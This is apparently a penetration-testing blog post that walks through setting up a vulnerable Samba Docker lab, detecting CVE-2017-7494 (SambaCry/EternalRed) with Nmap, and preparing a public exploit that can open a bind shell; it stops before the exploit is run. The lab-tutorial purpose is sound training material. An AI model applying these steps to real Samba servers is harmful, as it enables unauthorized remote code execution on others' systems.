---
layout: post
title:  "EternalRed aka Sambacry without Metasploit"
date:   2020-05-31 18:05:55 +0300
image:  EternalBlue/title.png
author-name: strik1r
tags:   [EternalRed, Without Metasploit, Exploit modification, Sambacry]
---

<h2>Prologue:</h2>
In this blog post we are going to explore using exploits without Metasploit at all. After EternalBlue, our next exploit will be EternalRed aka Sambacry.

<h3> Environment Setup </h3>
The easiest way to find an environment to test on, is to set up the docker machine with the instruction from the exploit page: https://github.com/opsxcq/exploit-CVE-2017-7494
But first we need to install docker. I will just show you all the commands I used to make it work on my KALI environment. The last line with hello world is just to test that everything worked:
```
curl -fsSL https://download.docker.com/linux/debian/gpg | sudo apt-key add -
echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list
sudo apt-get update
sudo apt-get remove docker docker-engine docker.io
sudo apt-get install docker-ce
sudo docker run hello-world
```

Then downloading and starting the vulnerable machine. I added some more open ports:

```
docker run --rm -it \
       -p 137-139:137-139 \
       -p 445:445 -p 6699:6699 \
	   -p 4444:4444 -p 5555:5555 \
       vulnerables/cve-2017-7494
```

In case you would like to conect to the docker machine you need to do two things. First determinate the container ID then connect to the container.

```
docker ps
docker exec -ti id bash
```

![connectToContainer](/img/EternalRed/connectToContainer.png)

<h2>Detection</h2>

So we want to detect if the taget is vulnerable to Sambacry. We will use Nmap for this.

```
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 127.0.0.1
```

![detection](/img/EternalRed/detect.png)

Oh we are vulnerable. I set the target ip to 127.0.0.1 because the docker command we used to start the box binds the port 445 to our local port 445. So we actually targeted the vulnerable box, not our attacker machine.

<h1>Exploit</h1>

<h2>Bind shell</h2>

First let's grab the exploit and install everything needed.

```
git clone https://github.com/opsxcq/exploit-CVE-2017-7494
cd exploit-CVE-2017-7494
pip install -r requirements.txt
```

Now we have all setup. But before running it, Let's check the code. Starting with exploit.py we should go down until the __main__ function. Here is where are code execution starts. 

```
    ap = ArgumentParser(description="Sambacry (CVE-2017-7494) exploit by opsxcq")
    ap.add_argument("-t", "--target", required=True, help="Target's hostname")
    ap.add_argument("-e", "--executable", required=True, help="Executable/Payload file to use")
    ap.add_argument("-s", "--remoteshare", required=True, help="Executable/Payload shared folder to use")
    ap.add_argument("-r", "--remotepath", required=True, help="Executable/Payload path on remote file system")
    ap.add_argument("-u", "--user", required=False, help="Samba username (optional")
    ap.add_argument("-p", "--password", required=False, help="Samba password (optional)")
	ap.add_argument("-P", "--remoteshellport", required=False, help="Connect to a shell running in the remote host after exploitation")
```

This block is the parameters block. We can see what is needed to run the exploit. We have a remote shell port option too. This is in case we want the code to automatically connect to the bind shell which runs on the target.
Under that we can see a port already set up to 445. We can change it but SMB wil lprobably be on port 445 so let's leave it for now.